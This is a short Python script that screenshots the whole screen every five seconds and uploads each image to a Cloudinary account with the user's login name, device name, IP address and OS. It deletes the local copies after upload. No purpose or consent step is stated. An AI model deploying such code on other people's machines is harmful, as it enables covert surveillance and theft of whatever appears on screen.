import pyautogui

from cloudinary import config
from cloudinary.uploader import upload
from datetime import datetime
from os import path, environ, getlogin, makedirs, remove
from platform import node, system
from time import sleep
from socket import gethostbyname, gethostname


def load_env():
    if path.exists(".env"):
        with open(".env") as f:
            for line in f:
                key, value = line.strip().split("=", 1)
                environ[key] = value


load_env()

config(
    cloud_name=environ.get("CLOUD_NAME"),
    api_key=environ.get("API_KEY"),
    api_secret=environ.get("API_SECRET"),
    secure=True,
)

SAVE_PATH = "screenshots"
makedirs(SAVE_PATH, exist_ok=True)

INTERVAL = 5
USER_NAME = getlogin()
DEVICE_NAME = node()
try:
    IP_ADDRESS = gethostbyname(gethostname())
except:
    IP_ADDRESS = "Unkown"
OS_NAME = system()


def upload_to_cloudinary(filepath: str) -> None:
    file_name = filepath[len(SAVE_PATH) + 1 : -4]
    time_stamp = datetime.now().isoformat()
    upload(
        filepath,
        display_name=file_name,
        folder=SAVE_PATH,
        tags=[USER_NAME, DEVICE_NAME],
        context={
            "user": USER_NAME,
            "device": DEVICE_NAME,
            "ip_address": IP_ADDRESS,
            "os_name": OS_NAME,
            "time_stamp": time_stamp,
        },
    )
    remove(filepath)


def take_screenshot():
    while True:
        filename = datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + ".png"
        filepath = path.join(SAVE_PATH, filename)

        screenshot = pyautogui.screenshot()
        screenshot.save(filepath)

        upload_to_cloudinary(filepath)

        print(f"Screenshot guardada: {filepath}")

        sleep(INTERVAL)


take_screenshot()
